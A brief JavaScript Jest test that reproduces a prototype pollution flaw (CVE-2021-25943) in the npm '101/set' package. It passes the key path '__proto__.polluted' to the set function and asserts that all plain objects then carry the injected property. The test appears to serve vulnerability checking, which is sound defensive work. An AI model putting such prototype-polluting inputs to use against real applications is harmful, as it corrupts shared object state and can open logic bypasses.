//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25943
test("prototype pollution in 101/set", () => {
  expect({}.polluted).toBe(undefined);

  const _101 = require("101/set");
  _101({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
